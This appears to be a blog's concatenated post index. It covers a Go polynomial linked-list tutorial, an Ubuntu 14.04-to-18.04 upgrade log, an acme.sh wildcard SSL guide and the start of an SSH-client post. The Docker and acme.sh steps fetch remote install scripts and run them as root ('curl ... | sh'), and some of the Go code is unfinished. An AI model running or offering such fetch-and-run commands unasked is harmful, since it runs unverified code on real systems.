减法实现原理 先把减数多项式的系数一一取相反数，然后调用加法函数即可实现。 乘法实现原理 $$M(x) = A(x) * B(x)$$\n若:\n$$A(x) = a_{0}+a_{1}x^1+a_2x^2+\\cdots+a_{n-1}x^{n-1}+a_nx^n$$\n则 :\n$$M(x) = B(x) * [a_{0}+a_{1}x^1+a_2x^2+\\cdots+a_{n-1}x^{n-1}+a_nx^n] $$,\n因此:\n$$M(x)=\\sum_{e=1}^{n}a_iB(x)x^i$$\n链表操作注意事项 注意事项:\n 需要对链表进行有效性判断 对于链表的操作过程中，首先要创建一个节点，并将头结点复制给新节点 如果要构建新的链表是，表头需要单独保存；同时每个节点需要创建新节点，完成赋值、指针操作；组后需要一个游标节点，负责将各个节点串联起来。 对于尾节点，最后一定要将其next指向NULL。 若在对链表操作时不想改变链表的值，则需要重新定义一个链表，并把原链表的内容赋给新链表。此时切记，不要把原链表的指针赋给新生成的结点，否则，在使用的过程中依旧会改变原链表，这是因为指针的特性  go代码实现 /* @Time : 2019/9/3 0:25 @Author : louis @File : poly @Software: GoLand */ package main import ( \u0026#34;fmt\u0026#34; ) // p,q 为当前计算节点; rear为指向和多项式链表的尾节点 // p.exp \u0026lt; q.exp ; p后移 // p.exp = q.exp ; 和为0,A中删除p,释放p,q;和不为零,修改p的数据域,释放q节点 // p.exp \u0026gt; q.exp ; q节点插入p之前,q节点的指针在原来的链表上后移 // a= 7+3x+9x^8+5x^17 // b= 8x+22x^7-9x^8 type PolyNode struct { coef int exp int next *PolyNode } type LinkPolyNode struct { head *PolyNode } func (l *LinkPolyNode) InsertFirst(c, e int) { date := \u0026amp;PolyNode{coef: c, exp: e} if l.head != nil { date.next = l.head } l.head = date } func (l *LinkPolyNode) GetOpposite() *LinkPolyNode { l1 := l p := l1.head if p == nil { return nil } for p != nil { p.coef *= -1 p = p.next } return l1 } func (l *LinkPolyNode) InsertLast(c, e int) { date := \u0026amp;PolyNode{coef: c, exp: e} if l.head == nil { // first one PolyNode \tdate.next = l.head return } } func (l *LinkPolyNode) PrintItems() { p := l.head if p == nil { fmt.Println(\u0026#34;empty\u0026#34;) } else { for p.next != nil { // 头结点的零值去掉 \tif p.coef == 0 { p = p.next continue } // 如果下一个节点的coef大于0,说明是加,否则就是减 \tif p.next.coef \u0026gt;= 0 { fmt.Printf(\u0026#34;%dx^%d+\u0026#34;, p.coef, p.exp) } else { fmt.Printf(\u0026#34;%dx^%d\u0026#34;, p.coef, p.exp) } p = p.next } fmt.Printf(\u0026#34;%dx^%d\\n\u0026#34;, p.coef, p.exp) } } func (l *LinkPolyNode) GetSize() (count int) { cur := l.head for cur != nil{ count++ cur = cur.next } return count } // TODO 感觉可以优化 // p,q 为当前计算节点; rear为指向和多项式链表的尾节点 // p.exp \u0026lt; q.exp ; 节点p所指的节点是\u0026#34;和多项式\u0026#34;中的一项,p后移 // p.exp = q.exp ; 合并同类项. // p.exp \u0026gt; q.exp ; q节点插入p之前,q节点的指针在原来的链表上后移 // a= 7+3x+9x^8+5x^17 // b= 8x+22x^7-9x^8 func (l *LinkPolyNode) Add(lb *LinkPolyNode) (lc *LinkPolyNode) { lc = \u0026amp;LinkPolyNode{} lc.head = \u0026amp;PolyNode{} //初始化头节点的PolyNode \t// 记住head头指针 \tpc := lc.head p, q := l.head.next, lb.head.next //采用尾插法,头结点没有元素,跳过 \tfor p != nil \u0026amp;\u0026amp; q != nil { var tmp = \u0026amp;PolyNode{} /*1. 节点p所指的节点是\u0026#34;和多项式\u0026#34;中的一项,p后移 */ if p.exp \u0026lt; q.exp { tmp.coef = p.coef tmp.exp = p.exp p = p.next /*2. 合并同类项,*/ } else if p.exp == q.exp { tmp.coef = p.coef + q.coef tmp.exp = p.exp p = p.next q = q.next /*3. q节点插入rear节点,q节点的指针在原来的链表上后移*/ } else { tmp.coef = q.coef tmp.exp = q.exp q = q.next } // 和不为零,将和插入至rear \tif tmp.coef != 0 { // 将rear.next指向tmp \tpc.next = tmp // 将rear指向tmp \tpc = tmp } } // 当p,q中有空的时候,说明其中的一个多项式已经算完了 \tfor p != nil { var tmp = \u0026amp;PolyNode{} tmp.coef = p.coef tmp.exp = p.exp p = p.next pc.next = tmp pc = tmp } for q != nil { var tmp = \u0026amp;PolyNode{} tmp.coef = q.coef tmp.exp = q.exp q = q.next pc.next = tmp //尾结点插入 \tpc = tmp } return lc } // 创建头节点LinkPolyNode func NewLinkPoly() (l *LinkPolyNode) { l = \u0026amp;LinkPolyNode{} l.head = \u0026amp;PolyNode{} rear := l.head var coef, exp int fmt.Scanln(\u0026amp;coef, \u0026amp;exp) for coef != 0 { s := \u0026amp;PolyNode{} s.coef = coef s.exp = exp rear.next = s rear = s fmt.Scanln(\u0026amp;coef, \u0026amp;exp) } return l } func main() { // a= 7+3x+9x^8+5x^17 \t// b= 8x+22x^7-9x^8  //b1 := Sub(b) \t//d := Add(a,b1) \t//ShowPoly(d) \tfmt.Println(\u0026#34;请输入A多项式例如:1*x^2 ==\u0026gt; (1 2),系数为0表示输入结束\u0026#34;) a := NewLinkPoly() a.PrintItems() fmt.Println(\u0026#34;请输入B多项式,系数为0表示输入结束\u0026#34;) b := NewLinkPoly() b.PrintItems() fmt.Println(\u0026#34;加法(0),减法(1):请输入:(默认为加法)\u0026#34;) var key byte fmt.Scanf(\u0026#34;%1d\u0026#34;,\u0026amp;key) switch key { case 1: //取相反数,再相加就好了 \tb1 := b.GetOpposite() d := a.Add(b1) d.PrintItems() case 0: fallthrough default: c := a.Add(b) c.PrintItems() } } /* 请输入A多项式1*x^2==\u0026gt;(1 2),系数为0表示输入结束 7 0 3 1 9 8 5 17 0 7x^0+3x^1+9x^8+5x^17 请输入B多项式,系数为0表示输入结束 8 1 22 7 -9 8 0 8x^1+22x^7-9x^8 加法(0),减法(1):请输入:(默认为加法) 7x^0+11x^1+22x^7+5x^17 */ // TODO 乘法后续空了补充 参考  王曙燕,王春梅,线性表第二章p41页算法2.19.数据结构与算法(人民邮电出版社).  ","permalink":"https://www.fenghong.tech/blog/algorithm/go-polyn-1/","tags":["markdown","polynomial","algorithm","link"],"title":"Go 多项式实现(1)"},{"categories":["ops"],"contents":"[TOC]\n 前言 升级ubuntu,为什么要升级呢?公司打算使用docker,老版本的ubuntu不支持docker-ce最新版,需要升级至18.04(LTS),这就很蛋疼了,对ubuntu的熟悉感差不多就只会dpcg,apt等简单的命令安装.查询了相关文档后,记录一下踩过的坑.\n requirment To install Docker Engine - Community, you need the 64-bit version of one of these Ubuntu versions:\n Disco 19.04 Cosmic 18.10 Bionic 18.04 (LTS) Xenial 16.04 (LTS)  开启升级之旅14.04-16.04 三条命名直接升级.\n$ sudo apt-get update $ sudo apt-get dist-upgrade $ sudo do-release-upgrade 开启升级之旅16.04-18.04\n$ sudo apt-get update $ sudo apt-get dist-upgrade $ sudo do-release-upgrade 验证是否成功升级,发现lsb模块丢失\n$ lsb_release -a No LSB modules are available. 升级安装丢失的模块lsb即可\n$ sudo apt-get install lsb-core 升级的过程如果只需要几条命令,那需要运维干啥呢~~.因为系统比较老,直接升级到最新版本,可能引发很多问题.\n这边引发的问题是python3, lsb-core ,lsb-release ,python3-apt\nlouis@qx-prod-qukuailian:~$ sudo apt update \u0026amp;\u0026amp; sudo apt upgrade Hit:1 http://xxg.mirrors.ucloud.cn/ubuntu bionic InRelease Get:2 http://xxg.mirrors.ucloud.cn/ubuntu bionic-updates InRelease [88.7 kB] Hit:5 https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic InRelease Get:3 http://xxg.mirrors.ucloud.cn/ubuntu bionic-backports InRelease [74.6 kB] Get:4 http://xxg.mirrors.ucloud.cn/ubuntu bionic-security InRelease [88.7 kB] Fetched 252 kB in 1s (304 kB/s) Reading package lists... Done Building dependency tree Reading state information... Done All packages are up to date. Reading package lists... Done Building dependency tree Reading state information... Done Calculating upgrade... Done 0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded. 4 not fully installed or removed. After this operation, 0 B of additional disk space will be used. Do you want to continue? [Y/n] y Setting up python3 (3.6.7-1~18.04) ... running python rtupdate hooks for python3.6... dpkg-query: package 'dh-python' is not installed Use dpkg --info (= dpkg-deb --info) to examine archive files, and dpkg --contents (= dpkg-deb --contents) to list their contents. Traceback (most recent call last): File \u0026quot;/usr/bin/py3clean\u0026quot;, line 210, in \u0026lt;module\u0026gt; main() File \u0026quot;/usr/bin/py3clean\u0026quot;, line 196, in main pfiles = set(dpf.from_package(options.package)) File \u0026quot;/usr/share/python3/debpython/files.py\u0026quot;, line 53, in from_package raise Exception(\u0026quot;cannot get content of %s\u0026quot; % package_name) Exception: cannot get content of dh-python error running python rtupdate hook dh-python dpkg: error processing package python3 (--configure): installed python3 package post-installation script subprocess returned error exit status 4 dpkg: dependency problems prevent configuration of lsb-core: lsb-core depends on python3; however: Package python3 is not configured yet. lsb-core depends on python3:any (\u0026gt;= 3.4~); however: Package python3 is not configured yet. dpkg: error processing package lsb-core (--configure): dependency problems - leaving unconfigured dpkg: dependency problems prevent configuration of lsb-release: lsb-release depends on python3:any (\u0026gt;= 3.4~); however: Package python3 is not configured yet. dpkg: error processing package lsb-release (--configure): dependency problems - leaving unconfigured dpkg: dependency problems prevent configuration of python3-apt: python3-apt depends on python3 (\u0026lt;\u0026lt; 3.7); however: Package python3 is not configured yet. python3-apt depends on python3 (\u0026gt;= 3.6~); however: Package python3 is not configured yet. python3-apt depends on python3:any (\u0026gt;= 3.3.2-2~); however: Package python3 is not configured yet. dpkg: error processing package python3-apt (--configure): dependency problems - leaving unconfigured Errors were encountered while processing: python3 lsb-core lsb-release python3-apt 首先定位一下python3,查找python3相关依赖\nroot@qx-prod-qukuailian:~# dpkg --configure python3 Setting up python3 (3.6.7-1~18.04) ... running python rtupdate hooks for python3.6... dpkg-query: package \u0026#39;dh-python\u0026#39; is not installed Use dpkg --info (= dpkg-deb --info) to examine archive files, and dpkg --contents (= dpkg-deb --contents) to list their contents. Traceback (most recent call last): File \u0026#34;/usr/bin/py3clean\u0026#34;, line 210, in \u0026lt;module\u0026gt; main() File \u0026#34;/usr/bin/py3clean\u0026#34;, line 196, in main pfiles = set(dpf.from_package(options.package)) File \u0026#34;/usr/share/python3/debpython/files.py\u0026#34;, line 53, in from_package raise Exception(\u0026#34;cannot get content of %s\u0026#34; % package_name) Exception: cannot get content of dh-python error running python rtupdate hook dh-python dpkg: error processing package python3 (--configure): installed python3 package post-installation script subprocess returned error exit status 4 Errors were encountered while processing: python3 看起来像python3安装不行,google了半天,发现需要重装Python3\n$ sudo apt-get install --reinstall python3 Reading package lists... Done Building dependency tree Reading state information... Done 0 upgraded, 0 newly installed, 1 reinstalled, 0 to remove and 0 not upgraded. 4 not fully installed or removed. After this operation, 0 B of additional disk space will be used. E: Internal Error, No file name for python3:amd64 root@qx-prod-qukuailian:~# sudo apt update \u0026amp;\u0026amp; sudo apt upgrade Hit:1 http://xxg.mirrors.ucloud.cn/ubuntu bionic InRelease Hit:2 http://xxg.mirrors.ucloud.cn/ubuntu bionic-updates InRelease Hit:5 https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic InRelease Hit:3 http://xxg.mirrors.ucloud.cn/ubuntu bionic-backports InRelease Hit:4 http://xxg.mirrors.ucloud.cn/ubuntu bionic-security InRelease Reading package lists... Done Building dependency tree Reading state information... Done All packages are up to date. Reading package lists... Done Building dependency tree Reading state information... Done Calculating upgrade... Done 0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded. 4 not fully installed or removed. After this operation, 0 B of additional disk space will be used. Do you want to continue? [Y/n] y Setting up python3 (3.6.7-1~18.04) ... running python rtupdate hooks for python3.6... dpkg-query: package \u0026#39;dh-python\u0026#39; is not installed Use dpkg --info (= dpkg-deb --info) to examine archive files, and dpkg --contents (= dpkg-deb --contents) to list their contents. Traceback (most recent call last): File \u0026#34;/usr/bin/py3clean\u0026#34;, line 210, in \u0026lt;module\u0026gt; main() File \u0026#34;/usr/bin/py3clean\u0026#34;, line 196, in main pfiles = set(dpf.from_package(options.package)) File \u0026#34;/usr/share/python3/debpython/files.py\u0026#34;, line 53, in from_package raise Exception(\u0026#34;cannot get content of %s\u0026#34; % package_name) Exception: cannot get content of dh-python error running python rtupdate hook dh-python dpkg: error processing package python3 (--configure): installed python3 package post-installation script subprocess returned error exit status 4 dpkg: dependency problems prevent configuration of lsb-core: lsb-core depends on python3; however: Package python3 is not configured yet. lsb-core depends on python3:any (\u0026gt;= 3.4~); however: Package python3 is not configured yet. dpkg: error processing package lsb-core (--configure): dependency problems - leaving unconfigured dpkg: dependency problems prevent configuration of lsb-release: lsb-release depends on python3:any (\u0026gt;= 3.4~); however: Package python3 is not configured yet. dpkg: error processing package lsb-release (--configure): dependency problems - leaving unconfigured dpkg: dependency problems prevent configuration of python3-apt: python3-apt depends on python3 (\u0026lt;\u0026lt; 3.7); however: Package python3 is not configured yet. python3-apt depends on python3 (\u0026gt;= 3.6~); however: Package python3 is not configured yet. python3-apt depends on python3:any (\u0026gt;= 3.3.2-2~); however: Package python3 is not configured yet. dpkg: error processing package python3-apt (--configure): dependency problems - leaving unconfigured Errors were encountered while processing: python3 lsb-core lsb-release python3-apt E: Sub-process /usr/bin/dpkg returned an error code (1) 黑人问号,搞了半天,陷入循环了么,升级依赖需要这些python3, lsb-core ,lsb-release ,python3-apt依赖,我重新安装又得依赖这些,陷入了先有鸡还是先有蛋的问题;然后想了半天,重新再次查看日志\ndpkg-query: package 'dh-python' is not installed 想了想,是不是应该安装这个依赖呢,直接就开启安装模式\nroot@qx-prod-qukuailian:~# apt-get install dh-python Reading package lists... Done Building dependency tree Reading state information... Done The following additional packages will be installed: python3-distutils python3-lib2to3 The following NEW packages will be installed: dh-python python3-distutils python3-lib2to3 0 upgraded, 3 newly installed, 0 to remove and 0 not upgraded. 4 not fully installed or removed. Need to get 0 B/307 kB of archives. After this operation, 2,556 kB of additional disk space will be used. Do you want to continue? [Y/n] y Selecting previously unselected package python3-lib2to3. (Reading database ... 22162 files and directories currently installed.) Preparing to unpack .../python3-lib2to3_3.6.8-1~18.04_all.deb ... Unpacking python3-lib2to3 (3.6.8-1~18.04) ... Selecting previously unselected package python3-distutils. Preparing to unpack .../python3-distutils_3.6.8-1~18.04_all.deb ... Unpacking python3-distutils (3.6.8-1~18.04) ... Selecting previously unselected package dh-python. Preparing to unpack .../dh-python_3.20180325ubuntu2_all.deb ... Unpacking dh-python (3.20180325ubuntu2) ... Setting up python3 (3.6.7-1~18.04) ... running python rtupdate hooks for python3.6... running python post-rtupdate hooks for python3.6... Setting up lsb-release (9.20170808ubuntu1) ... Setting up python3-lib2to3 (3.6.8-1~18.04) ... Setting up python3-distutils (3.6.8-1~18.04) ... Setting up python3-apt (1.6.4) ... Setting up lsb-core (9.20170808ubuntu1) ... Setting up dh-python (3.20180325ubuntu2) ... Processing triggers for man-db (2.8.3-2ubuntu0.1) ... W: APT had planned for dpkg to do more than it reported back (24 vs 28). Affected packages: python3:amd64 root@qx-prod-qukuailian:~# sudo apt update \u0026amp;\u0026amp; sudo apt upgrade Hit:1 http://xxg.mirrors.ucloud.cn/ubuntu bionic InRelease Hit:5 https://mirrors.aliyun.com/docker-ce/linux/ubuntu bionic InRelease Hit:2 http://xxg.mirrors.ucloud.cn/ubuntu bionic-updates InRelease Hit:3 http://xxg.mirrors.ucloud.cn/ubuntu bionic-backports InRelease Hit:4 http://xxg.mirrors.ucloud.cn/ubuntu bionic-security InRelease Reading package lists... Done Building dependency tree Reading state information... Done All packages are up to date. Reading package lists... Done Building dependency tree Reading state information... Done Calculating upgrade... Done 0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded. 哟,没有报错,说明安装成功,日志的查看也非常重要,仔细分析报错内容,针对性的执行命令会更容易解决问题,验证一下升级是否成功.\n$ lsb_release -a LSB Version:\tcore-9.20170808ubuntu1-noarch:security-9.20170808ubuntu1-noarch Distributor ID:\tUbuntu Description:\tUbuntu 18.04.3 LTS Release:\t18.04 Codename:\tbionic 升级完,查看systemctl,也就是systemd是否可以执行,执行命令发现python又报了一个错误.\nroot@qx-prod-qukuailian:~# systemctl Traceback (most recent call last): File \u0026quot;/usr/lib/python3.6/dbm/gnu.py\u0026quot;, line 4, in \u0026lt;module\u0026gt; from _gdbm import * ModuleNotFoundError: No module named '_gdbm' During handling of the above exception, another exception occurred: Traceback (most recent call last): File \u0026quot;/usr/lib/python3/dist-packages/CommandNotFound/CommandNotFound.py\u0026quot;, line 7, in \u0026lt;module\u0026gt; import dbm.gnu as gdbm File \u0026quot;/usr/lib/python3.6/dbm/gnu.py\u0026quot;, line 6, in \u0026lt;module\u0026gt; raise ImportError(str(msg) + ', please install the python3-gdbm package') ImportError: No module named '_gdbm', please install the python3-gdbm package During handling of the above exception, another exception occurred: Traceback (most recent call last): File \u0026quot;/usr/lib/command-not-found\u0026quot;, line 27, in \u0026lt;module\u0026gt; from CommandNotFound.util import crash_guard File \u0026quot;/usr/lib/python3/dist-packages/CommandNotFound/__init__.py\u0026quot;, line 3, in \u0026lt;module\u0026gt; from CommandNotFound.CommandNotFound import CommandNotFound File \u0026quot;/usr/lib/python3/dist-packages/CommandNotFound/CommandNotFound.py\u0026quot;, line 9, in \u0026lt;module\u0026gt; import gdbm ModuleNotFoundError: No module named 'gdbm' 缺乏gdbm包,这里安装一下这个包就可以解决问题.\n$ sudo apt-get install gdbm 重头戏来了,做了这么多,就是想要系统可以支持docker-ce最新版\n$ curl -fsSL get.docker.com -o get-docker.sh $ sudo sh get-docker.sh --mirror Aliyun $ sudo systemctl start docker System has not been booted with systemd as init system (PID 1). Can\u0026#39;t operate. docker是成功安装了,但是systemd却没有启动起来,所以这里想了下,既然docker已经安装了,直接用service启动是否可以呢?结果发现启动成功\n$ sudo service docker start docker start/running, process 1451 $ sudo docker info Client: Debug Mode: false Server: Containers: 0 Running: 0 Paused: 0 Stopped: 0 Images: 0 Server Version: 19.03.1 Storage Driver: aufs Root Dir: /var/lib/docker/aufs Backing Filesystem: extfs Dirs: 0 Dirperm1 Supported: false Logging Driver: json-file Cgroup Driver: cgroupfs Plugins: Volume: local Network: bridge host ipvlan macvlan null overlay Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog Swarm: inactive Runtimes: runc Default Runtime: runc Init Binary: docker-init containerd version: 894b81a4b802e4eb2a91d1ce216b8817763c29fb runc version: 425e105d5a03fabd737a126ad93d62a9eeede87f init version: fec3683 Security Options: apparmor seccomp Profile: default Kernel Version: 3.13.0-63-generic Operating System: Ubuntu 18.04.3 LTS OSType: linux Architecture: x86_64 CPUs: 4 Total Memory: 7.798GiB Name: qx-prod-qukuailian ID: 3H4E:BQXC:DVYP:DOPO:FDKT:4HJH:MPMB:LSRP:3LDS:CW56:VZZL:Q6T2 Docker Root Dir: /var/lib/docker Debug Mode: false Registry: https://index.docker.io/v1/ Labels: Experimental: false Insecure Registries: 127.0.0.0/8 Live Restore Enabled: false WARNING: No swap limit support WARNING: the aufs storage-driver is deprecated, and will be removed in a future release. 总结 大功告成,在整个升级的过程中,曲曲折折,中途都想要重装系统了,但是通过一步一步分析报错信息,一步一步查找解决方案,去试错,最终问题就被解决.但是记得要有PlanB,升级之前记得做好快照,即使最后没有解决,我们可以通过快照恢复,不会破坏整个系统.\n参考  No LSB modules are available.  No module named \u0026lsquo;gdbm\u0026rsquo; A Packages Problem,Unable to install anything due to unconfigured and depandesies  ","permalink":"https://www.fenghong.tech/blog/ops/ubuntu14.04to18.04/","tags":["ubuntu","upgrade"],"title":"ubuntu 14.04 upgrade to 18.04(LTS)"},{"categories":["server","ops"],"contents":"[TOC]\n acme.sh：https://github.com/Neilpang/acme.sh\nLet\u0026rsquo;s Encrypt 已经支持通配符SSL证书，这是很让人开心的事情。由于通配符域名的特殊性，比如说你不应该在只持有子域名如ailion.github.com时，就能申请到*.github.com的通配符证书，不然github就完蛋了。因此，通配符证书的申请要比普通证书申请更加复杂和严格。\n $表示shell, #表示注释, \u0026gt; 表示 数据库\n安装acme.sh\n$ curl https://get.acme.sh | sh 泛域名证书生成 其实github上的操作已经够细致了，这边主要解释利用阿里云的DNSAPI来生产泛域名证书。\n首先,登录阿里云账户,获取api授权. https://ak-console.aliyun.com/#/accesskey,\n建议使用子账户Ram授权方式,https://ram.console.aliyun.com/policies/AliyunDNSFullAccess\n只读权限是不可以的，因为它本质上还是通过添加TXT记录的方式来验证，它会用脚本来帮你添加,所以这里给的是AliyunDNSFullAccess。\nexport Ali_Key=\u0026quot;sdfsdfsdfljlbjkljlkjsdfoiwje\u0026quot; export Ali_Secret=\u0026quot;jlsdflanljkljlfdsaklkjflsa\u0026quot; Ok, let\u0026rsquo;s issue a cert now:\nacme.sh --issue --dns dns_ali -d *.example.com 如果是root账户进行授权issue,加上--force:\nacme.sh --issue --dns dns_ali -d *.example.com --force 具体看https://github.com/Neilpang/acme.sh/wiki/sudo\nThe Ali_Key and Ali_Secret will be saved in ~/.acme.sh/account.conf and will be reused when needed。\n一般的错误:环境变量设置错误.\n ~]# acme.sh --issue -d '*.example.com' --dns dns_ali --force [Mon Sep 2 10:06:58 CST 2019] Single domain='*.example.com' [Mon Sep 2 10:06:58 CST 2019] Getting domain auth token for each domain [Mon Sep 2 10:07:00 CST 2019] Getting webroot for domain='*.example.com' [Mon Sep 2 10:07:00 CST 2019] Adding txt value: eAp0uvSMnH529uRdumebXJmn6PQabQBfchpgwNqQHoM for domain: _acme-challenge.example.com [Mon Sep 2 10:07:00 CST 2019] You don't specify aliyun api key and secret yet. [Mon Sep 2 10:07:00 CST 2019] Error add txt for domain:_acme-challenge.example.com [Mon Sep 2 10:07:00 CST 2019] Please add '--debug' or '--log' to check more details. [Mon Sep 2 10:07:00 CST 2019] See: https://github.com/Neilpang/acme.sh/wiki/How-to-debug-acme.sh 成功一般是这样的:\n# ./acme.sh --issue --dns dns_ali -d '*.example.com' --force [Mon Sep 2 10:13:46 CST 2019] Single domain='*.example.com' [Mon Sep 2 10:13:46 CST 2019] Getting domain auth token for each domain [Mon Sep 2 10:13:48 CST 2019] Getting webroot for domain='*.example.com' [Mon Sep 2 10:13:48 CST 2019] Adding txt value: VYhSy8k-BV6UhSLPJmDuRxxgzE-3YLWmlMq6i9rpt-U for domain: _acme-challenge.example.com [Mon Sep 2 10:13:50 CST 2019] The txt record is added: Success. [Mon Sep 2 10:13:50 CST 2019] Let's check each dns records now. Sleep 20 seconds first. [Mon Sep 2 10:14:11 CST 2019] Checking example.com for _acme-challenge.example.com [Mon Sep 2 10:14:13 CST 2019] Domain example.com '_acme-challenge.example.com' success. [Mon Sep 2 10:14:13 CST 2019] All success, let's return [Mon Sep 2 10:14:13 CST 2019] Verifying: *.example.com [Mon Sep 2 10:14:16 CST 2019] Success [Mon Sep 2 10:14:16 CST 2019] Removing DNS records. [Mon Sep 2 10:14:16 CST 2019] Removing txt: VYhSy8k-BV6UhSLPJmDuRxxgzE-3YLWmlMq6i9rpt-U for domain: _acme-challenge.example.com [Mon Sep 2 10:14:19 CST 2019] Removed: Success [Mon Sep 2 10:14:19 CST 2019] Verify finished, start to sign. [Mon Sep 2 10:14:19 CST 2019] Lets finalize the order, Le_OrderFinalize: https://acme-v02.api.letsencrypt.org/acme/finalize/64821731/1006905583 [Mon Sep 2 10:14:21 CST 2019] Download cert, Le_LinkCert: https://acme-v02.api.letsencrypt.org/acme/cert/03a8c20bd0553f46fc90702473498ef6e4ae [Mon Sep 2 10:14:22 CST 2019] Cert success. -----BEGIN CERTIFICATE----- ************************* -----END CERTIFICATE----- [Mon Sep 2 10:14:22 CST 2019] Your cert is in /root/.acme.sh/*.example.com/*.example.com.cer [Mon Sep 2 10:14:22 CST 2019] Your cert key is in /root/.acme.sh/*.example.com/*.example.com.key [Mon Sep 2 10:14:22 CST 2019] The intermediate CA cert is in /root/.acme.sh/*.example.com/ca.cer [Mon Sep 2 10:14:22 CST 2019] And the full chain certs is there: /root/.acme.sh/*.example.com/fullchain.cer 自动renew $ acme.sh --install-cert -d *.example.com --key-file /etc/nginx/sslkey/cert.example.com.key --fullchain-file /etc/nginx/sslkey/example.fullchain.cer --reloadcmd \u0026quot;nginx -s reload\u0026quot; --force [Mon Sep 2 10:20:34 CST 2019] Installing key to:/etc/nginx/sslkey/cert.example.com.key [Mon Sep 2 10:20:34 CST 2019] Installing full chain to:/etc/nginx/sslkey/example.fullchain.cer [Mon Sep 2 10:20:34 CST 2019] Run reload cmd: nginx -s reload [Mon Sep 2 10:20:34 CST 2019] Reload success [root@jx_web_slave .acme.sh]# acme.sh --cron -f [Mon Sep 2 10:20:49 CST 2019] ===Starting cron=== [Mon Sep 2 10:20:49 CST 2019] Renew: '*.example.com' [Mon Sep 2 10:20:49 CST 2019] Single domain='*.example.com' [Mon Sep 2 10:20:49 CST 2019] Getting domain auth token for each domain [Mon Sep 2 10:20:51 CST 2019] Getting webroot for domain='*.example.com' [Mon Sep 2 10:20:51 CST 2019] *.example.com is already verified, skip dns-01. [Mon Sep 2 10:20:51 CST 2019] Verify finished, start to sign. [Mon Sep 2 10:20:51 CST 2019] Lets finalize the order, Le_OrderFinalize: https://acme-v02.api.letsencrypt.org/acme/finalize/64821731/1006938413 [Mon Sep 2 10:20:54 CST 2019] Download cert, Le_LinkCert: https://acme-v02.api.letsencrypt.org/acme/cert/03d49c06af74d208ed7d6a6d8bdc3ee20b30 [Mon Sep 2 10:20:54 CST 2019] Cert success. -----BEGIN CERTIFICATE----- ************************* -----END CERTIFICATE----- [Mon Sep 2 10:20:54 CST 2019] Your cert is in /root/.acme.sh/*.example.com/*.example.com.cer [Mon Sep 2 10:20:54 CST 2019] Your cert key is in /root/.acme.sh/*.example.com/*.example.com.key [Mon Sep 2 10:20:54 CST 2019] The intermediate CA cert is in /root/.acme.sh/*.example.com/ca.cer [Mon Sep 2 10:20:54 CST 2019] And the full chain certs is there: /root/.acme.sh/*.example.com/fullchain.cer [Mon Sep 2 10:20:54 CST 2019] Installing key to:/etc/nginx/sslkey/cert.example.com.key [Mon Sep 2 10:20:54 CST 2019] Installing full chain to:/etc/nginx/sslkey/example.fullchain.cer [Mon Sep 2 10:20:54 CST 2019] Run reload cmd: nginx -s reload [Mon Sep 2 10:20:54 CST 2019] Reload success [Mon Sep 2 10:20:54 CST 2019] ===End cron=== 这条命令会生成一个crontab;\n--install-cert是将泛域名*.example.com进行安装到指定的目录.\n--key-file  是将泛域名*.example.com这个证书的key安装的位置.\n比如/etc/nginx/sslkey/cert.example.com.key;\n--fullchain-file 是将泛域名*.example.com这个证书的cer安装的位置\n如/etc/nginx/sslkey/example.fullchain.cer;\n--reloadcmd 证书生成之后重启nginx,实现自动renew\n$ acme.sh --install-cert -d *.example.com --key-file /etc/nginx/sslkey/cert.example.com.key --fullchain-file /etc/nginx/sslkey/example.fullchain.cer --reloadcmd \u0026quot;nginx -s reload\u0026quot; --force $ crontab -l 47 0 * * * \u0026quot;/root/.acme.sh\u0026quot;/acme.sh --cron --home \u0026quot;/root/.acme.sh\u0026quot; \u0026gt; /dev/null 在nginx.conf中的ssl配置片段如下:\nserver { listen 443 ssl; ## server_name 可以是*.example.com任意一个,证书都是下面这个. server_name admin.example.com; ssl_certificate /etc/nginx/sslkey/example.fullchain.cer; ssl_certificate_key /etc/nginx/sslkey/cert.example.com.key; ssl_session_timeout 5m; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_prefer_server_ciphers on; } 至此,大功告成.\n参考  Neilpang/acne.sh  ","permalink":"https://www.fenghong.tech/blog/ops/acme-ssl-cert/","tags":["ssl","acmeTiny"],"title":"use acme.sh to renew ssl cert"},{"categories":["algorithm"],"contents":"[TOC]\nssh  SSH全称Secure Shell是一种工作在应用层和传输层上的安全协议，能在非安全通道上建立安全通道。提供身份认证、密钥更新、数据校验、通道复用等功能，同时具有良好的可扩展性,由芬兰赫尔辛基大学研究员Tatu Ylönen,于1995年提出，其目的是用于替代非安全的Telnet、rsh、rexec等远程Shell协议。之后SSH发展了两个大版本,SSH-1和SSH-2, 开源实现OpenSSH对2者都支持。\n SSH的主要特性:\n 加密: 避免数据内容泄漏 通信的完整性: 避免数据被篡改，以及发送或接受地址伪装(检查数据是否被篡改，数据是否来自发送者而非攻击者） SSH-2通过MD5和SHA-1实现该功能，SSH-1使用CRC-32 认证: 识别数据发送者和接收者身份 客户端验证SSH服务端的身份：防止攻击者仿冒SSH服务端身份，避免中介人攻击和重定向请求的攻击；OpenSSH通过在know-hosts中存储主机名和host key对服务端身份进行认证 服务端验证请求者身份：提供安全性较弱的用户密码方式，和安全性更强的per-user public-key signatures；此外SSH还支持与第三方安全服务系统的集成，如Kerberos等 授权: 用户访问控制 安全隧道: 转发或者为基于TCP/IP的回话提供加密隧道, 比如通过SSH为Telnet、FTP等提供通信安全保障，支持三种类型的Forwarding操作：Port Forwarding；X Forwarding；Agent Forwarding  通过使用SSH，你可以把所有传输的数据进行加密，这样”中间人”这种攻击方式就不可能实现了，而且也能够防止DNS欺骗和IP欺骗。使用SSH，还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的速度。SSH有很多功能，它既可以代替Telnet，又可以为FTP、PoP、甚至为PPP提供一个安全的”通道”。\nGo中ssh客户端实现 实现远程执行命令\n/* @Time : 2019/8/30 11:22 @Author : louis @File : ssh @Software: GoLand */ package main import ( \u0026#34;errors\u0026#34; \u0026#34;fmt\u0026#34; flag \u0026#34;github.com/spf13/pflag\u0026#34; \u0026#34;golang.org/x/crypto/ssh\u0026#34; \u0026#34;golang.org/x/crypto/ssh/terminal\u0026#34; 